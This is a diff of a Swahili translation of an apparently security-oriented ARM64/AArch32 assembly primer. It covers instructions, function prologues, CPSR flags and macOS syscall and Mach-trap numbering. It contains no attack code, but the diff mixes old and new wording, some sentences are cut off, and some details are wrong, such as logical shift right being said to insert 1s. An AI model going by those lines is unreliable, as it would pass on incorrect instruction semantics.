+* Mfano: `sub x0, x1, x2` — Hii inatoa tofauti ya thamani katika `x2` kutoka kwa `x1` na kuihifadhi katika `x0`.
+* **`subs`** Hii ni kama sub lakini inasasisha bendera
+* **`mul`**: **Kuzidisha** thamani za **registri mbili** na kuhifadhi matokeo katika registri.
+* Mfano: `mul x0, x1, x2` — Hii inazidisha thamani katika `x1` na `x2` na kuihifadhi katika `x0`.
+* **`div`**: **Kugawanya** thamani ya registri moja kwa nyingine na kuhifadhi matokeo katika registri.
+* Mfano: `div x0, x1, x2` — Hii inagawanya thamani katika `x1` kwa `x2` na kuihifadhi katika `x0`.
+* **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
+* **Kuhamisha mantiki kushoto**: Ongeza 0 kutoka mwisho ukihamisha biti nyingine mbele (kuzidisha mara n-kwa 2)
+* **Kuhamisha mantiki kulia**: Ongeza 1 mwanzoni ukihamisha biti nyingine nyuma (kugawanya mara n-kwa 2 kwa nambari zisizo na saini)
+* **Kuhamisha kiarithmetiki kulia**: Kama **`lsr`**, lakini badala ya kuongeza 0 ikiwa biti muhimu zaidi ni 1, **1s** huongezwa (kugawanya mara n-kwa 2 kwa nambari zenye saini)
+* **Kuzungusha kulia**: Kama **`lsr`** lakini chochote kinachotolewa kutoka kulia huongezwa kushoto
+* **Kuzungusha Kulia na Kueneza**: Kama **`ror`**, lakini na bendera ya kubeba kama "biti muhimu zaidi". Kwa hivyo bendera ya kubeba inahamishiwa kwa biti ya 31 na biti iliyotolewa kwa bendera ya kubeba.
+* **`bfm`**: **Kuhamisha Sehemu ya Biti**, hizi ni operesheni za **nakili biti `0...n`** kutoka kwa thamani na kuziweka katika nafasi **`m..m+n`**. **`#s`** inabainisha nafasi ya **biti ya kushoto** na **`#r`** kiasi cha **kuzungusha kulia**.
+* Kuhamisha sehemu ya biti: `BFM Xd, Xn, #r`
+* Kuhamisha sehemu ya biti yenye saini: `SBFM Xd, Xn, #r, #s`
+* Kuhamisha sehemu ya biti isiyo na saini: `UBFM Xd, Xn, #r, #s`
+* **Kuondoa na Kuingiza Sehemu ya Biti:** Nakili sehemu ya biti kutoka kwa kusajili na kuizindua kwa kusajili lingine.
+* **`BFI X1, X2, #3, #4`** Ingiza biti 4 kutoka X2 kutoka biti ya 3 ya X1
+* **`BFXIL X1, X2, #3, #4`** Toa kutoka biti ya 3 ya X2 biti nne na nakili kwa X1
+* **`SBFIZ X1, X2, #3, #4`** Kueneza ishara biti 4 kutoka X2 na kuziingiza kwa X1 kuanzia nafasi ya biti 3 kwa kufuta biti za kulia
+* **`SBFX X1, X2, #3, #4`** Toa biti 4 kuanzia biti 3 kutoka X2, ongeza ishara, na weka matokeo kwa X1
+* **`UBFIZ X1, X2, #3, #4`** Ongeza 0s (zisizo na saini) kwa biti 4 kutoka X2 na kuziingiza kwa X1 kuanzia nafasi ya biti 3 kwa kufuta biti za kulia
+* **`UBFX X1, X2, #3, #4`** Toa biti 4 kuanzia biti 3 kutoka X2 na weka matokeo yaliyoongezwa 0 kwa X1.
+* **Kuongeza Ishara Kwenda X:** Kuongeza ishara (au kuongeza tu 0s katika toleo lisilo na saini) ya thamani ili kuweza kufanya operesheni nayo:
+* **`SXTB X1, W2`** Ongeza ishara ya baiti **kutoka W2 kwenda X1** (`W2` ni nusu ya `X2`) ili kujaza 64bits
+* **`SXTH X1, W2`** Ongeza ishara ya nambari ya 16bit **kutoka W2 kwenda X1** ili kujaza 64bits
+* **`SXTW X1, W2`** Ongeza ishara ya baiti **kutoka W2 kwenda X1** ili kujaza 64bits
+* **`UXTB X1, W2`** Ongeza 0s (zisizo na saini) kwa baiti **kutoka W2 kwenda X1** ili kujaza 64bits
+* **`extr`:** Toa biti kutoka kwa **jozi ya usajili uliounganishwa**.
+* Mfano: `EXTR W3, W2, W1, #3` Hii ita **unganisha W1+W2** na kupata **kutoka biti 3 ya W2 hadi biti 3 ya W1** na kuihifadhi katika W3.
+* **`cmp`**: **Hilinganisha** usajili wawili na weka bendera za hali. Ni **jina mbadala la `subs`** ikiiweka usajili wa marudio kuwa usajili wa sifuri. Inafaa kujua ikiwa `m == n`.
+* Inaunga mkono **sintaksia sawa na `subs`**
+* Mfano: `cmp x0, x1` — Hii inalinganisha thamani katika `x0` na `x1` na kuweka bendera za hali kulingana.
+* **`cmn`**: **Hilinganisha hasi** ya operandi. Katika kesi hii ni **jina mbadala la `adds`** na inaunga mkono sintaksia sawa. Inafaa kujua ikiwa `m == -n`.
+* **`ccmp`**: Hilinganisha kwa sharti, ni hilinganishi litakalofanywa tu ikiwa hilinganishi la awali lilikuwa kweli na litaweka hasa biti za nzcv.
+* `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> ikiwa x1 != x2 na x3 < x4, ruka kwenye func
+* Hii ni kwa sababu **`ccmp`** itatekelezwa tu ikiwa **`cmp` ya awali ilikuwa `NE`**, ikiwa haikuwa hivyo, biti za `nzcv` zitawekwa kuwa 0 (ambayo haitakidhi hilinganishi la `blt`).
+* Hii inaweza pia kutumika kama `ccmn` (sawa lakini hasi, kama `cmp` vs `cmn`).
+* **`tst`**: Inachunguza ikiwa thamani yoyote ya hilinganishi ni 1 (inafanya kazi kama na ANDS bila kuhifadhi matokeo mahali popote). Ni muhimu kuchunguza usajili na thamani na kuangalia ikiwa biti yoyote ya usajili iliyotajwa katika thamani ni 1.
+* Mfano: `tst X1, #7` Angalia ikiwa biti za mwisho 3 za X1 ni 1
+* **`teq`**: Operesheni ya XOR ikikataa matokeo
+* **`b`**: Tawi lisilo na sharti
+* Mfano: `b myFunction`&#x20;
+* Tafadhali kumbuka hii haitajaza usajili wa kiungo na anwani ya kurudi (haifai kwa wito wa subrutine ambao unahitaji kurudi nyuma)
+* **`bl`**: **Tawi** na kiungo, hutumika kwa **kuita** **subrutine**. Huhifadhi **anwani ya kurudi katika `x30`**.
 * Mfano: `bl myFunction` — Hii inaita kazi `myFunction` na kuhifadhi anwani ya kurudi katika `x30`.
-* **`blr`**: **Branch** na Kiungo kwenda Usajili, hutumiwa ku**ita** **sehemu ndogo** ambapo lengo lime**bainishwa** katika **usajili**. Inahifadhi anwani ya kurudi katika `x30`.
+* Tafadhali kumbuka hii haitajaza usajili wa kiungo na anwani ya kurudi (haifai kwa wito wa subrutine ambao unahitaji kurudi nyuma)
+* **`blr`**: **Tawi** na Kiungo kwenda Usajili, hutumika kwa **kuita** **subrutine** ambapo lengo limetajwa katika **usajili**. Huhifadhi anwani ya kurudi katika `x30`. (Hii ni&#x20;
 * Mfano: `blr x1` — Hii inaita kazi ambayo anwani yake iko katika `x1` na kuhifadhi anwani ya kurudi katika `x30`.
-* **`ret`**: **Kurudi** kutoka kwa **sehemu ndogo**, kawaida kwa kutumia anwani katika **`x30`**.
-* Mfano: `ret` — Hii inarudi kutoka kwa sehemu ndogo ya sasa kwa kutumia anwani ya kurudi katika `x30`.
-* **`cmp`**: **Hilinganisha** usajili mbili na kuweka alama za hali. Ni **jina mbadala la `subs`** ambayo inaweka usajili wa marudio kuwa usajili wa sifuri. Inafaa kujua kama `m == n`.
-* Inasaidia **sintaksia ile ile kama `subs`**
-* Mfano: `cmp x0, x1` — Hii inalinganisha thamani katika `x0` na `x1` na kuweka alama za hali kulingana na hilo.
-* **`cmn`**: **Hilinganisha** hasi ya **operandi**. Katika kesi hii ni **jina mbadala la `adds`** na inasaidia sintaksia ile ile. Inafaa kujua kama `m == -n`.
-* **tst**: Inachunguza ikiwa thamani yoyote ya usajili ni 1 (inafanya kazi kama ANDS bila kuhifadhi matokeo mahali popote)
-* Mfano: `tst X1, #7` Angalia ikiwa moja ya bits za mwisho 3 za X1 ni 1
-* **`b.eq`**: **Branch if equal**, kulingana na maagizo ya `cmp` ya awali.
-* Mfano: `b.eq label` — Ikiwa maagizo ya `cmp` ya awali yalipata thamani mbili sawa, hii inaruka hadi `label`.
-* **`b.ne`**: **Branch if Not Equal**. Maagizo haya yanachunguza alama za hali (ambazo ziliwekwa na maagizo ya kulinganisha ya awali), na ikiwa thamani zilizolinganishwa hazikuwa sawa, inaruka hadi lebo au anwani.
-* Mfano: Baada ya maagizo ya `cmp x0, x1`, `b.ne label` — Ikiwa thamani katika `x0` na `x1` hazikuwa sawa, hii inaruka hadi `label`.
-* **`cbz`**: **Compare and Branch on Zero**. Maagizo haya yanalinganisha usajili na sifuri, na ikiwa ni sawa, inaruka hadi lebo au anwani.
-* Mfano: `cbz x0, label` — Ikiwa thamani katika `x0` ni sifuri, hii inaruka hadi `label`.
-* **`cbnz`**: **Compare and Branch on Non-Zero**. Maagizo haya yanalinganisha usajili na sifuri, na ikiwa hazilingani, inaruka hadi lebo au anwani.
-* Mfano: `cbnz x0, label` — Ikiwa thamani katika `x0` sio sifuri, hii inaruka hadi `label`.
-* **`adrp`**: Hesabu **anwani ya ukurasa wa ishara** na kuihifadhi katika usajili.
-* Mfano: `adrp x0, symbol` — Hii inahesabu anwani ya ukurasa wa `symbol` na kuihifadhi katika `x0`.
-* **`ldrsw`**: **Pakia** thamani ya **32-bit** yenye ishara kutoka kumbukumbu na **kuipanua ishara hadi 64** bits.
-* Mfano: `ldrsw x0, [x1]` — Hii inapakia thamani ya 32-bit yenye ishara kutoka kwenye eneo la kumbukumbu linaloelekezwa na `x1`, inaipanua ishara hadi 64 bits, na kuihifadhi katika `x0`.
-* **`stur`**: **Hifadhi thamani ya usajili kwenye eneo la kumbukumbu**, kwa kutumia mbadala kutoka kwa usajili mwingine.
-* Mfano: `stur x0, [x1, #4]` — Hii inahifadhi thamani katika `x0` kwenye anwani ya kumbukumbu ambayo ni byte 4 zaidi ya anwani iliyopo katika `x1`.
-* **`svc`** : Fanya **wito wa mfumo**. Inasimama kwa "Supervisor Call". Wakati processor inatekeleza maagizo haya, inafanya **ubadilishaji kutoka hali ya
-### **Utangulizi wa Kazi**
+* **`ret`**: **Kurudi** kutoka kwa **subrutine**, kawaida kwa kutumia anwani katika **`x30`**.
+* Mfano: `ret` — Hii inarudi kutoka kwa subrutine ya sasa ikitumia anwani ya kurudi katika `x30`.
+* **`b.<cond>`**: Matawi ya sharti
+* **`b.eq`**: **Tawi ikiwa sawa**, kulingana na maagizo ya hivi karibuni ya `cmp`.
+* Mfano: `b.eq label` — Ikiwa maagizo ya hivi karibuni ya `cmp` yalipata thamani mbili sawa, hii inaruka kwenye `label`.
+* **`b.ne`**: **Tawi ikiwa Sio Sawa**. Maagizo haya yanachunguza bendera za hali (ambazo ziliwekwa na maagizo ya hilinganishi ya awali), na ikiwa thamani zilizolinganishwa hazikuwa sawa, inaruka kwenye lebo au anwani.
+* Mfano: Baada ya maagizo ya `cmp x0, x1`, `b.ne label` — Ikiwa thamani katika `x0` na `x1` hazikuwa sawa, hii inaruka kwenye `label`.
+* **`cbz`**: **Hilinganisha na Tawi kwa Sifuri**. Maagizo haya yanalinganisha usajili na sifuri, na ikiwa ni sawa, inaruka kwenye lebo au anwani.
+* Mfano: `cbz x0, label` — Ikiwa thamani katika `x0` ni sifuri, hii inaruka kwenye `label`.
+* **`cbnz`**: **Hilinganisha na Tawi kwa Sio Sifuri**. Maagizo haya yanalinganisha usajili na sifuri, na ikiwa sio sawa, inaruka kwenye lebo au anwani.
+* Mfano: `cbnz x0, label` — Ikiwa thamani katika `x0` si sifuri, hii inaruka kwenda `label`.
+* **`tbnz`**: Jaribu biti na ruka kama si sifuri
+* Mfano: `tbnz x0, #8, label`
+* **`tbz`**: Jaribu biti na ruka kama ni sifuri
+* Mfano: `tbz x0, #8, label`
+* **Operesheni za kuchagua kwa sharti**: Hizi ni operesheni ambazo tabia yake inatofautiana kulingana na biti za sharti.
+* `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Ikiwa ni kweli, X0 = X1, ikiwa ni uongo, X0 = X2
+* `csinc Xd, Xn, Xm, cond` -> Ikiwa ni kweli, Xd = Xn, ikiwa ni uongo, Xd = Xm + 1
+* `cinc Xd, Xn, cond` -> Ikiwa ni kweli, Xd = Xn + 1, ikiwa ni uongo, Xd = Xn
+* `csinv Xd, Xn, Xm, cond` -> Ikiwa ni kweli, Xd = Xn, ikiwa ni uongo, Xd = NOT(Xm)
+* `cinv Xd, Xn, cond` -> Ikiwa ni kweli, Xd = NOT(Xn), ikiwa ni uongo, Xd = Xn
+* `csneg Xd, Xn, Xm, cond` -> Ikiwa ni kweli, Xd = Xn, ikiwa ni uongo, Xd = - Xm
+* `cneg Xd, Xn, cond` -> Ikiwa ni kweli, Xd = - Xn, ikiwa ni uongo, Xd = Xn
+* `cset Xd, Xn, Xm, cond` -> Ikiwa ni kweli, Xd = 1, ikiwa ni uongo, Xd = 0
+* `csetm Xd, Xn, Xm, cond` -> Ikiwa ni kweli, Xd = \<all 1>, ikiwa ni uongo, Xd = 0
+* **`adrp`**: Hesabu **anwani ya ukurasa wa ishara** na ihifadhi kwenye kirejista.
+* Mfano: `adrp x0, ishara` — Hii inahesabu anwani ya ukurasa wa `ishara` na kuihifadhi kwenye `x0`.
+* **`ldrsw`**: **Pakia** thamani ya **32-bit** iliyosainiwa kutoka kumbukumbu na **ongeza ishara hadi 64** biti.
+* Mfano: `ldrsw x0, [x1]` — Hii inapakia thamani iliyosainiwa ya 32-bit kutoka kwenye eneo la kumbukumbu linaloelekezwa na `x1`, inaongeza ishara hadi 64 biti, na kuihifadhi kwenye `x0`.
+* **`stur`**: **Hifadhi thamani ya kirejista kwenye eneo la kumbukumbu**, ukitumia mbadala kutoka kwa kirejista kingine.
+* Mfano: `stur x0, [x1, #4]` — Hii inahifadhi thamani katika `x0` kwenye anwani ya kumbukumbu ambayo ni byte 4 zaidi ya anwani iliyopo kwenye `x1`.
+* **`svc`** : Fanya **wito wa mfumo**. Inasimama kwa "Wito wa Msimamizi". Wakati processor inatekeleza maagizo haya, inabadilisha kutoka hali ya mtumiaji hadi hali ya msingi na kuruka kwenye eneo maalum kwenye kumbukumbu ambapo msimbo wa **ushughulikiaji wa wito wa mfumo wa kernel** uko.
+*   Mfano:
 
-1. **Hifadhi rekodi ya kiungo na kipima cha fremu kwenye steki**:
+```armasm
+mov x8, 93  ; Pakia nambari ya wito wa mfumo kwa ajili ya kutoka (93) kwenye kirejista x8.
+mov x0, 0   ; Pakia nambari ya hali ya kutoka (0) kwenye kirejista x0.
+svc 0       ; Fanya wito wa mfumo.
+```
+
+### **Prologi ya Kazi**
+
+1. **Hifadhi kirejista cha kiungo na kielekezi cha fremu kwenye steki**:
 
 {% code overflow="wrap" %}
 ```armasm
-stp x29, x30, [sp, #-16]!  ; hifadhi jozi ya x29 na x30 kwenye steki na punguza kipima cha steki
+stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
 ```
 {% endcode %}
-2. **Sanidi kipima kipya cha fremu**: `mov x29, sp` (inasanidi kipima kipya cha fremu kwa kazi ya sasa)
-3. **Tenga nafasi kwenye steki kwa ajili ya pembejeo za ndani** (ikiwa inahitajika): `sub sp, sp, <ukubwa>` (ambapo `<ukubwa>` ni idadi ya bayti zinazohitajika)
 
-### **Hitimisho la Kazi**
+2. **Wekeza alama ya fremu mpya**: `mov x29, sp` (inaweka alama ya fremu mpya kwa kazi ya sasa)
+3. **Tenga nafasi kwenye steki kwa mizani ya ndani** (ikiwa inahitajika): `sub sp, sp, <size>` (ambapo `<size>` ni idadi ya baiti inayohitajika)
 
-1. **Futa pembejeo za ndani (ikiwa zilitengwa)**: `add sp, sp, <ukubwa>`
-2. **Rejesha rekodi ya kiungo na kipima cha fremu**:
+### **Epilogo ya Kazi**
+
+1. **Futa mizani ya ndani (ikiwa ilikuwa imetengwa)**: `add sp, sp, <size>`
+2. **Rejesha mchakato wa kiungo na alama ya fremu**:
 
 {% code overflow="wrap" %}
 ```armasm
@@ -169,16 +258,16 @@ ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment th
 ```
 {% endcode %}
 
-3. **Kurudi**: `ret` (inarejesha udhibiti kwa mtu anayetoa wito kwa kutumia anwani katika daftari la viungo)
+3. **Kurudi**: `ret` (inarejesha udhibiti kwa mtu aliyetoa wito kwa kutumia anwani kwenye daftari la viungo)
 
 ## Hali ya Utekelezaji wa AARCH32
 
 Armv8-A inasaidia utekelezaji wa programu za biti 32. **AArch32** inaweza kukimbia katika moja ya **seti mbili za maagizo**: **`A32`** na **`T32`** na inaweza kubadilisha kati yao kupitia **`interworking`**.\
-Programu za **64-bit** zenye **mamlaka** zinaweza kupanga **utekelezaji wa programu za biti 32** kwa kutekeleza uhamisho wa kiwango cha kipekee kwenda kwa biti 32 zenye mamlaka ya chini.\
-Tambua kuwa mpito kutoka kwa biti 64 kwenda kwa biti 32 hufanyika na kiwango cha kipekee cha chini (kwa mfano, programu ya biti 64 katika EL1 inayosababisha programu katika EL0). Hii inafanywa kwa kuweka **biti 4 ya** **`SPSR_ELx`** daftari maalum **kuwa 1** wakati mchakato wa mchakato wa `AArch32` uko tayari kutekelezwa na sehemu iliyobaki ya `SPSR_ELx` inahifadhi programu za **`AArch32`** CPSR. Kisha, mchakato wenye mamlaka huita maagizo ya **`ERET`** ili mchakato uhamie kwa **`AArch32`** kuingia katika A32 au T32 kulingana na CPSR**.**
+Programu za biti 64 **zenye haki** zinaweza kupanga **utekelezaji wa programu za biti 32** kwa kutekeleza uhamisho wa kiwango cha kipekee kwenda kwa programu ya biti 32 yenye haki ya chini.\
+Tambua kwamba mpito kutoka biti 64 kwenda biti 32 hufanyika na kiwango cha chini cha kiwango cha kipekee (kwa mfano programu ya biti 64 katika EL1 inachochea programu katika EL0). Hii hufanywa kwa kuweka **biti 4 ya** **`SPSR_ELx`** daftari maalum **kuwa 1** wakati mchakato wa watekelezaji wa `AArch32` uko tayari kutekelezwa na sehemu iliyobaki ya `SPSR_ELx` inahifadhi mipango ya **`AArch32`** CPSR. Kisha, mchakato wenye haki huita maagizo ya **`ERET`** ili mchakato ubadilike kwenda **`AArch32`** ukiingia katika A32 au T32 kulingana na CPSR\*\*.\*\*
 
-**`Interworking`** inafanyika kwa kutumia biti za J na T za CPSR. `J=0` na `T=0` inamaanisha **`A32`** na `J=0` na `T=1` inamaanisha **T32**. Hii kimsingi inamaanisha kuweka **biti ya chini kuwa 1** kuonyesha kuwa seti ya maagizo ni T32.\
-Hii inawekwa wakati wa maagizo ya matawi ya **interworking**, lakini pia inaweza kuwekwa moja kwa moja na maagizo mengine wakati PC inawekwa kama daftari la marudio. Mfano:
+**`Interworking`** hufanyika kwa kutumia biti za J na T za CPSR. `J=0` na `T=0` inamaanisha **`A32`** na `J=0` na `T=1` inamaanisha **T32**. Hii kimsingi inamaanisha kuweka **biti ya chini kuwa 1** kuashiria seti ya maagizo ni T32.\
+Hii inawekwa wakati wa **maagizo ya matawi ya interworking,** lakini inaweza pia kuwekwa moja kwa moja na maagizo mengine wakati PC inawekwa kama daftari la marudio. Mfano:
 
 Mfano mwingine:
 ```armasm
@@ -191,61 +280,62 @@ bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)
 mov r0, #0
 mov r0, #8
 ```
-### Virejista
+### Rejista
 
-Kuna virejista 16 vya biti 32 (r0-r15). Kutoka r0 hadi r14 wanaweza kutumika kwa operesheni yoyote, hata hivyo baadhi yao kawaida hutengwa:
+Kuna rejista 16 za biti 32 (r0-r15). **Kutoka r0 hadi r14** wanaweza kutumika kwa **operesheni yoyote**, hata hivyo baadhi yao kawaida huwa zimehifadhiwa:
 
-* `r15`: Kumbukumbu ya programu (daima). Ina anwani ya maagizo yanayofuata. Katika A32, sasa + 8, katika T32, sasa + 4.
-* `r11`: Kumbukumbu ya fremu
-* `r12`: Kumbukumbu ya wito wa ndani wa taratibu
-* `r13`: Kumbukumbu ya mstari wa mstari
-* `r14`: Kumbukumbu ya kiungo
+- **`r15`**: Programu ya kuhesabu (daima). Ina anwani ya maagizo yanayofuata. Katika A32 sasa + 8, katika T32, sasa + 4.
+- **`r11`**: Kiashiria cha fremu
+- **`r12`**: Rejista ya wito wa ndani wa utaratibu
+- **`r13`**: Kiashiria cha steki
+- **`r14`**: Kiashiria cha kiungo
 
-Zaidi ya hayo, virejista hurejeshwa katika virejista vilivyohifadhiwa. Ambavyo ni sehemu ambazo hifadhi thamani za virejista kuruhusu kubadilisha muktadha haraka katika kushughulikia kwa kushughulikia kwa kushughulikia na operesheni za kibali ili kuepuka haja ya kuokoa na kurejesha virejista kwa mkono kila wakati. Hii inafanywa kwa kuhifadhi hali ya mchakato kutoka kwa CPSR hadi SPSR ya hali ya mchakato ambayo kosa linachukuliwa. Wakati kosa linarudi, CPSR inarejeshwa kutoka SPSR.
+Zaidi ya hayo, rejista zinahifadhiwa katika **`rejista zilizohifadhiwa`**. Ambazo ni sehemu zinazohifadhi thamani za rejista kuruhusu kufanya **mabadiliko ya muktadha haraka** katika kushughulikia kwa kipekee na operesheni za haki ili kuepuka haja ya kuhifadhi na kurejesha rejista kila wakati.\
+Hii hufanywa kwa **kuihifadhi hali ya mchakato kutoka kwa `CPSR` hadi `SPSR`** ya hali ya mchakato ambayo kipekee inachukuliwa. Wakati wa kurudi kutoka kwa kipekee, **`CPSR`** inarejeshwa kutoka kwa **`SPSR`**.
 
-### CPSR - Usajili wa Hali ya Programu ya Sasa
+### CPSR - Rejista ya Hali ya Programu ya Sasa
 
-Katika AArch32, CPSR inafanya kazi kama PSTATE katika AArch64 na pia imehifadhiwa katika SPSR_ELx wakati kosa linachukuliwa ili kurejesha baadaye utekelezaji:
+Katika AArch32 CPSR inafanya kazi kama **`PSTATE`** katika AArch64 na pia inahifadhiwa katika **`SPSR_ELx`** wakati kipekee inachukuliwa ili kurejesha baadaye utekelezaji:
 
 <figure><img src="../../../.gitbook/assets/image (725).png" alt=""><figcaption></figcaption></figure>
 
-Sehemu zimegawanywa katika vikundi kadhaa:
+Vipengele vimegawanywa katika vikundi kadhaa:
 
-* Usajili wa Hali ya Programu ya Maombi (APSR): Bendera za hisabati na zinaweza kufikiwa kutoka EL0
-* Usajili wa Hali ya Utekelezaji: Tabia ya mchakato (inayosimamiwa na OS).
+- Rejista ya Hali ya Programu ya Maombi (APSR): Alama za hesabu na inayopatikana kutoka EL0
+- Rejista za Hali ya Utekelezaji: Tabia ya mchakato (inasimamiwa na OS).
 
-#### Usajili wa Hali ya Programu ya Maombi (APSR)
+#### Rejista ya Hali ya Programu ya Maombi (APSR)
 
-* Bendera za `N`, `Z`, `C`, `V` (kama vile katika AArch64)
-* Bendera ya `Q`: Inawekwa kuwa 1 wakati unapotokea **kuzidi kwa nambari ya kiasi** wakati wa utekelezaji wa maagizo ya hisabati ya kujaza. Mara ilipo wekwa kuwa **1**, itaendelea kuwa na thamani hiyo hadi itakapowekwa kuwa 0 kwa mkono. Zaidi ya hayo, hakuna maagizo yoyote yanayochunguza thamani yake kwa njia ya siri, lazima ichunguzwe kwa kuisoma kwa mkono.
-* Bendera za `GE` (Kubwa au sawa): Hutumiwa katika operesheni za SIMD (Maagizo Moja, Data Nyingi), kama vile "kuongeza kwa pamoja" na "kupunguza kwa pamoja". Operesheni hizi huruhusu kusindika alama nyingi za data katika maagizo moja.
+- Alama za **`N`**, **`Z`**, **`C`**, **`V`** (sawa na AArch64)
+- Alama ya **`Q`**: Inawekwa kuwa 1 wakati **kutukuka kwa nambari za jumla kunatokea** wakati wa utekelezaji wa maagizo maalum ya kutukuka ya hesabu. Mara tu inapowekwa kuwa **`1`**, itabaki na thamani hiyo mpaka iwekwe kwa mkono kuwa 0. Zaidi ya hayo, hakuna maagizo yoyote yanayochunguza thamani yake kwa kawaida, lazima ifanywe kusoma kwa mkono.
+- **`GE`** (Kubwa au sawa) Alama: Hutumiwa katika operesheni za SIMD (Maagizo Moja, Data Nyingi) kama "kuongeza kwa pamoja" na "kutoa kwa pamoja". Operesheni hizi huruhusu kusindika pointi nyingi za data katika maagizo moja.
 
-Kwa mfano, maagizo ya `UADD8` yanaongeza jozi nne za herufi (kutoka kwa waendeshaji wawili wa biti 32) kwa pamoja na kuhifadhi matokeo katika usajili wa biti 32. Kisha inaweka bendera za `GE` katika `APSR` kulingana na matokeo haya. Kila bendera ya GE inalingana na moja ya kuongezwa kwa herufi, ikionyesha ikiwa kuongezwa kwa jozi hiyo ya herufi kumefurika.
+Kwa mfano, maagizo ya **`UADD8`** **ya kuongeza jozi nne za herufi** (kutoka kwa waendeshaji wawili wa biti 32) kwa pamoja na kuhifadhi matokeo katika rejista ya biti 32. Kisha **inaweka alama za `GE` katika `APSR`** kulingana na matokeo haya. Kila alama ya GE inalingana na moja ya kuongeza kwa herufi, ikionyesha ikiwa kuongeza kwa jozi hiyo ya herufi **kulivuja**.
 
-Maagizo ya `SEL` hutumia bendera hizi za GE kutekeleza hatua za masharti.
+Maagizo ya **`SEL`** hutumia alama hizi za GE kutekeleza hatua za masharti.
 
-#### Usajili wa Hali ya Utekelezaji
+#### Rejista za Hali ya Utekelezaji
 
-* Biti za `J` na `T`: `J` inapaswa kuwa 0 na ikiwa `T` ni 0, seti ya maagizo ya A32 hutumiwa, na ikiwa ni 1, seti ya maagizo ya T32 hutumiwa.
-* Usajili wa Hali ya Bloki ya IT (`ITSTATE`): Hizi ni biti kutoka 10-15 na 25-26. Huhifadhi hali za maagizo ndani ya kikundi kilicho na kipimo cha `IT`.
-* Biti ya `E`: Inaonyesha utaratibu wa kumalizia.
-* Biti za Njia na Kizuizi cha Kosa (0-4): Zinaamua hali ya sasa ya utekelezaji. Ya tano inaonyesha ikiwa programu inaendeshwa kama 32bit (1) au 64bit (0). Nne zingine zinaonyesha hali ya kosa inayotumiwa wakati kosa linatokea na linashughulikiwa. Nambari iliyowekwa inaonyesha kipaumbele cha sasa ikiwa kosa lingine litasababishwa wakati huu unashughulikiwa.
+- Vipande vya **`J`** na **`T`**: **`J`** inapaswa kuwa 0 na ikiwa **`T`** ni 0 seti ya maagizo ya A32 hutumiwa, na ikiwa ni 1, T32 hutumiwa.
+- Rejista ya Hali ya Bloki ya IT (`ITSTATE`): Hizi ni vipande kutoka 10-15 na 25-26. Huhifadhi masharti ya maagizo ndani ya kikundi kilicho na kipimo cha **`IT`**.
+- Biti ya **`E`**: Inaonyesha **endianness**.
+- **Vipande vya Hali na Kizuizi cha Kipekee** (0-4): Vinabainisha hali ya sasa ya utekelezaji. Cha tano kinaonyesha ikiwa programu inaendeshwa kama biti 32 (1) au biti 64 (0). Nyingine 4 zinaonyesha **hali ya kipekee inayotumiwa kwa sasa** (wakati kipekee kinatokea na kinashughulikiwa). Nambari iliyowekwa inaonyesha **kipaumbele cha sasa** ikiwa kipekee nyingine itaanzishwa wakati huu unashughulikiwa.
 
 <figure><img src="../../../.gitbook/assets/image (728).png" alt=""><figcaption></figcaption></figure>
 
-* `AIF`: Baadhi ya makosa yanaweza kuzimwa kwa kutumia biti za `A`, `I`, `F`. Ikiwa `A` ni 1, inamaanisha makosa ya kusumbua yatasababishwa. `I` inaunda jibu kwa ombi za vifaa vya nje vya kuingilia (IRQs). na F inahusiana na Ombi za Kuingilia Kwa Kasi (FIRs).
+- **`AIF`**: Baadhi ya kipekee zinaweza kuzimwa kwa kutumia vipande **`A`**, `I`, `F`. Ikiwa **`A`** ni 1 inamaanisha **kuzimwa kwa ghafla** kutafanyika. **`I`** inaconfigure kujibu kwa **Ombi za Kuingilia za Vifaa vya Nje** (IRQs). na F inahusiana na **Ombi za Kuingilia za Haraka** (FIRs).
 
 ## macOS
 
-### Wito wa BSD
+### BSD syscalls
 
-Angalia [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master). Wito wa BSD utakuwa na **x16 > 0**.
+Angalia [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master). BSD syscalls zitakuwa na **x16 > 0**.
 
 ### Mach Traps
 
-Angalia [**syscall\_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall\_sw.c.auto.html). Mach traps watakuwa na **x16 < 0**, kwa hivyo unahitaji kuita nambari kutoka kwa orodha ya awali na ishara ya chini: **`_kernelrpc_mach_vm_allocate_trap`** ni **`-10`**.
+Angalia [**syscall\_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall\_sw.c.auto.html). Mach traps zitakuwa na **x16 < 0**, hivyo unahitaji kuita nambari kutoka kwa orodha ya awali kwa kwa kutumia ishara ya hasi: **`_kernelrpc_mach_vm_allocate_trap`** ni **`-10`**.
 
-Unaweza pia kuangalia **`libsystem_kernel.dylib`** katika disassembler ili kupata jinsi ya kuita hizi (na BSD) syscalls:
+Unaweza pia kuangalia **`libsystem_kernel.dylib`** katika disassembler ili kujua jinsi ya kuita hizi (na BSD) syscalls:
 ```bash
 # macOS
 dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e
@@ -254,12 +344,12 @@ dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Lib
 dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
 ```
 {% hint style="success" %}
-Maranyingi ni rahisi kuangalia **msimbo uliopanguliwa** kutoka **`libsystem_kernel.dylib`** **kuliko** kuangalia **msimbo wa chanzo** kwa sababu msimbo wa wito wa syscalls kadhaa (BSD na Mach) unazalishwa kupitia hati (angalia maoni katika msimbo wa chanzo) wakati katika dylib unaweza kupata kinachoitwa.
